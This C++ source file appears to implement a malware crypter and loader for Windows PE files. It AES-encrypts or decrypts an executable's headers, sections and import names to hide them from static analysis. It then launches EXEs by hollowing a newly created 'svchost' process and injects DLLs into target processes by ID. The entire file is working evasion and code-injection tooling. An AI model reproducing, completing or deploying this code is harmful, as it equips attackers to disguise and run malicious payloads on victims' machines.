#include "pe_file.hpp"
#include "pe_structs.hpp"

#include "pe_injector.hpp"
#include "pe_process.hpp"

#include <iterator>

#include <cryptopp\osrng.h>
#include <cryptopp\aes.h>
#include <cryptopp\modes.h>
#include <cryptopp\filters.h>

#pragma comment(lib, "cryptopp\\cryptlib_dll.lib")

pe_file::pe_file(aes_buffer aes_data)
	: offset(0), aes(aes_data)
{

}

void pe_file::load(const std::string& file_path)
{
	std::ifstream f(file_path.c_str(), std::ios_base::binary | std::ios_base::ate);
	std::size_t size = static_cast<std::size_t>(f.tellg());

	unsigned char* buffer = new unsigned char[size];

	f.seekg(0, std::ios_base::beg);
	f.read(reinterpret_cast<char*>(buffer), size);
		
	std::copy(&buffer[0], &buffer[size], std::back_inserter(this->data));

	delete[] buffer;
	f.close();
}

void pe_file::save(const std::string& file_path)
{
	std::ofstream f(file_path.c_str(), std::ios_base::binary);
	f.write(reinterpret_cast<char*>(this->data.data()), this->data.size());
	f.close();
}

bool pe_file::update(bool decrypt)
{
	if (!this->update_dos_header(decrypt))
	{
		printf("failed to update DOS header\n");
		return false;
	}

	if (!this->update_pe_header(decrypt))
	{
		printf("failed to update PE header\n");
		return false;
	}

	if (!this->update_optional_header(decrypt))
	{
		printf("failed to update optional header\n");
		return false;
	}
	
	if (!this->update_section_headers(decrypt))
	{
		printf("failed to update section headers\n");
		return false;
	}

	if (decrypt)
	{
		if (!this->update_sections(decrypt))
		{
			printf("failed to update sections\n");
			return false;
		}
	}

	if (!this->update_exports(decrypt))
	{
		printf("failed to update exports\n");
		return false;
	}

	if (!this->update_imports(decrypt))
	{
		printf("failed to update imports\n");
		return false;
	}

	if (!decrypt)
	{
		if (!this->update_sections(decrypt))
		{
			printf("failed to update sections\n");
			return false;
		}
	}
	
	return true;
}

unsigned int pe_file::execute()
{
	if (this->is_exe_file())
	{
		return this->launch_exe();
	}

	return static_cast<unsigned int>(0);
}

bool pe_file::inject(unsigned int process_id)
{
	if (this->is_dll_file())
	{
		return this->inject_dll(process_id);
	}

	return false;
}

bool pe_file::update_dos_header(bool decrypt)
{
	dos_header* header = reinterpret_cast<dos_header*>(this->data.data());

	if (decrypt)
		this->crypt_buffer(reinterpret_cast<unsigned char*>(header), sizeof(dos_header), decrypt);

	if (!this->unpack_dos_header(header))
		return false;

	if (!decrypt)
		this->crypt_buffer(reinterpret_cast<unsigned char*>(header), sizeof(dos_header), decrypt);

	return true;
}

bool pe_file::unpack_dos_header(dos_header* header)
{
	const unsigned int dos_signature = 'M' | ('Z' << 8);

	if (header->magic != dos_signature || !header->pe_offset)
		return false;
		
	this->offset = header->pe_offset;
	return true;
}

bool pe_file::update_pe_header(bool decrypt)
{
	pe_header* header = reinterpret_cast<pe_header*>(this->data.data() + this->offset);
	
	if (decrypt)
		this->crypt_buffer(reinterpret_cast<unsigned char*>(header), sizeof(pe_header), decrypt);

	if (!this->unpack_pe_header(header))
		return false;

	if (!decrypt)
		this->crypt_buffer(reinterpret_cast<unsigned char*>(header), sizeof(pe_header), decrypt);

	return true;
}

bool pe_file::unpack_pe_header(pe_header* header)
{
	const unsigned int pe_signature = 'P' | ('E' << 8);

	if (header->signature != pe_signature)
		return false;

	if (header->characteristics & file_executable_image)
	{
		if (header->characteristics & file_dll)
			this->file_type = file_type::dll;
		else
			this->file_type = file_type::exe;
	}
	else
		return false;
		
	this->section_count = header->section_count;
	this->offset += sizeof(pe_header);
	return true;
}

bool pe_file::update_optional_header(bool decrypt)
{
	optional_header* header = reinterpret_cast<optional_header*>(this->data.data() + this->offset);
		
	if (decrypt)
		this->crypt_buffer(reinterpret_cast<unsigned char*>(header), sizeof(optional_header), decrypt);

	if (!this->unpack_optional_header(header))
		return false;

	if (!decrypt)
		this->crypt_buffer(reinterpret_cast<unsigned char*>(header), sizeof(optional_header), decrypt);

	return true;
}

bool pe_file::unpack_optional_header(optional_header* header)
{
	const unsigned int optional_signature_32 = 0x10B;

	if (header->magic != optional_signature_32)
		return false;
	
	data_directory export_directory = header->data_directory[directory_entry_export];
	this->export_infos = std::make_pair(export_directory.virtual_address, export_directory.size);
	
	data_directory import_directory = header->data_directory[directory_entry_import];
	this->import_infos = std::make_pair(import_directory.virtual_address, import_directory.size);
		
	this->offset += sizeof(optional_header);	
	return true;
}

bool pe_file::update_section_headers(bool decrypt)
{
	section_header* header = reinterpret_cast<section_header*>(this->data.data() + this->offset);
		
	for (std::size_t i = 0; i < this->section_count; i++, header++, this->offset += sizeof(section_header))
	{
		if (decrypt)
			this->crypt_buffer(reinterpret_cast<unsigned char*>(header), sizeof(section_header), decrypt);

		if (!this->unpack_section_headers(header))
			return false;

		if (!decrypt)
			this->crypt_buffer(reinterpret_cast<unsigned char*>(header), sizeof(section_header), decrypt);
	}
	
	return true;
}

bool pe_file::unpack_section_headers(section_header* header)
{
	this->sections.push_back(*header);
	return true;
}

bool pe_file::update_exports(bool decrypt)
{
	if (!export_infos.first || !export_infos.second)
		return true;

	export_directory* directory = reinterpret_cast<export_directory*>(this->data.data() + this->rva_to_offset(this->export_infos.first));

	if (decrypt)
		this->crypt_buffer(reinterpret_cast<unsigned char*>(directory), sizeof(export_directory), decrypt);

	if (!this->unpack_exports(directory))
		return false;

	if (!decrypt)
		this->crypt_buffer(reinterpret_cast<unsigned char*>(directory), sizeof(export_directory), decrypt);
	
	return true;
}

bool pe_file::unpack_exports(export_directory* directory)
{
	if (directory->function_count <= 0 || directory->name_count <= 0)
		return true;

	char** name_addresses = reinterpret_cast<char**>(this->data.data() + this->rva_to_offset(directory->names_address));
	unsigned char** function_addresses = reinterpret_cast<unsigned char**>(this->data.data() + this->rva_to_offset(directory->functions_address));
	unsigned short* name_ordinals_addresses = reinterpret_cast<unsigned short*>(this->data.data() + this->rva_to_offset(directory->name_ordinals_address));
		
	for (unsigned int i = 0; i < directory->name_count; i++)
	{
		char* function_name = reinterpret_cast<char*>(this->data.data() + this->rva_to_offset(reinterpret_cast<unsigned int>(name_addresses[i])));
		unsigned short function_ordinal = name_ordinals_addresses[i];
		unsigned char* function = reinterpret_cast<unsigned char*>(this->data.data() + this->rva_to_offset(reinterpret_cast<unsigned int>(function_addresses[function_ordinal])));
	}
	
	return true;
}

bool pe_file::update_imports(bool decrypt)
{
	if (!import_infos.first || !import_infos.second)
		return false;

	for (import_descriptor* descriptor = reinterpret_cast<import_descriptor*>(this->data.data() + this->rva_to_offset(this->import_infos.first)); descriptor->characteristics != 0; descriptor++)
	{
		if (decrypt)
			this->crypt_buffer(reinterpret_cast<unsigned char*>(descriptor), sizeof(import_descriptor), decrypt);

		if (!this->unpack_imports(descriptor, decrypt))
			return false;

		if (!decrypt)
			this->crypt_buffer(reinterpret_cast<unsigned char*>(descriptor), sizeof(import_descriptor), decrypt);
	}

	return true;
}

bool pe_file::unpack_imports(import_descriptor* descriptor, bool decrypt)
{
	const unsigned __int32 ordinal_flag_32 = 0x80000000;

	if (descriptor->original_first_thunk)
	{
		for (thunk_data* thunk = reinterpret_cast<thunk_data*>(this->data.data() + this->rva_to_offset(descriptor->original_first_thunk)); thunk->data_address != 0; thunk++)
		{
			if (!(thunk->ordinal & ordinal_flag_32))
			{
				unsigned char* function_name = reinterpret_cast<import_by_name*>(this->data.data() + this->rva_to_offset(thunk->data_address))->name;
				this->crypt_buffer(function_name, strlen(reinterpret_cast<char*>(function_name)), decrypt);
			}
		}
		
		unsigned char* library_name = this->data.data() + this->rva_to_offset(descriptor->name);
		this->crypt_buffer(library_name, strlen(reinterpret_cast<char*>(library_name)), decrypt);
	}

	return true;
}

bool pe_file::update_sections(bool decrypt)
{
	for (section_header& section : this->sections)
	{
		unsigned char* section_raw_pointer = this->data.data() + section.raw_data_pointer;
		this->crypt_buffer(section_raw_pointer, section.raw_data_size, decrypt);
	}
	
	return true;
}

void pe_file::crypt_buffer(unsigned char* buffer, std::size_t size, bool decrypt)
{
	if (decrypt)
	{
		CryptoPP::CFB_Mode<CryptoPP::AES>::Decryption decryptor(this->aes.key, sizeof(aes_key), this->aes.iv);
		decryptor.ProcessData(buffer, buffer, size);
	}
	else
	{
		CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption encryptor(this->aes.key, sizeof(aes_key), this->aes.iv);
		encryptor.ProcessData(buffer, buffer, size);
	}
}

unsigned __int64 pe_file::rva_to_offset(unsigned __int64 rva)
{
	if (rva)
	{
		for (section_header& section : this->sections)
		{
			if (section.virtual_address <= rva && (section.virtual_address + section.misc.virtual_size) > rva)
			{
				return (rva - section.virtual_address + section.raw_data_pointer);
			}
		}
	}

	return rva;
}

unsigned int pe_file::launch_exe()
{
	pe_process hollow;

	if (hollow.create_process("svchost"))
		if (hollow.hollow_process(this->data))
			return hollow.get_process_id();

	return static_cast<unsigned int>(0);
}

bool pe_file::inject_dll(unsigned int process_id)
{
	pe_injector hollow;

	if (process_id)
		return hollow.remote_load_library(process_id, this->data);
	else
		return hollow.local_load_library(this->data);
}

bool pe_file::is_dll_file()
{
	return (this->file_type == file_type::dll);
}

bool pe_file::is_exe_file()
{
	return (this->file_type == file_type::exe);
}